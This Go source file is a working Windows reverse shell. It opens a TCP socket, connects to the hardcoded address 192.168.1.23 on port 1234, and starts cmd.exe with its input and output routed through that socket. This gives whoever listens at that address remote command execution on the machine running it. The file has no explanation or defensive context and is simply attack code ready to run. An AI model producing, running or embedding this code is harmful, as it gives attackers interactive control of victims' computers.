package main


import (
	"golang.org/x/sys/windows"
	"log"
	"net"
	"syscall"
	"unsafe"
)

var (
	wsaData windows.WSAData
	destination	windows.Sockaddr
)

func ipToSockaddr(family int, ip net.IP, port int) (windows.Sockaddr, error) {
	switch family {
	case syscall.AF_INET:
		if len(ip) == 0 {
			ip = net.IPv4zero
		}
		if ip = ip.To4(); ip == nil {
			return nil, net.InvalidAddrError("non-IPv4 address")
		}
		sa := new(windows.SockaddrInet4)
		for i := 0; i < net.IPv4len; i++ {
			sa.Addr[i] = ip[i]
		}
		sa.Port = port
		return sa, nil
	}
	return nil, net.InvalidAddrError("unexpected socket family")
}

func main() {
	windows.WSAStartup(514, &wsaData)
	s1, err := windows.WSASocket(windows.AF_INET, windows.SOCK_STREAM, windows.IPPROTO_TCP, nil, 0, 0)
	if err != nil {
		log.Println(err)
	}

	destination, err = ipToSockaddr(windows.AF_INET, net.ParseIP("192.168.1.23"), 1234)
	if err != nil {
		log.Println(err)
	}
	windows.Connect(s1, destination)
	A := new(windows.StartupInfo)
	A.Cb = uint32(unsafe.Sizeof(*A))
	A.Flags = syscall.STARTF_USESTDHANDLES | syscall.STARTF_USESHOWWINDOW
	A.StdInput = s1
	A.StdOutput = s1
	A.StdErr = s1
	ProcInfo := new(windows.ProcessInformation)
	dos, err := windows.UTF16PtrFromString("cmd.exe")
	if err != nil {
		log.Println(err)
	}
	err = windows.CreateProcess(
		nil,
		dos,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		A,
		ProcInfo)
	if err != nil {
		log.Println(err)
	}
}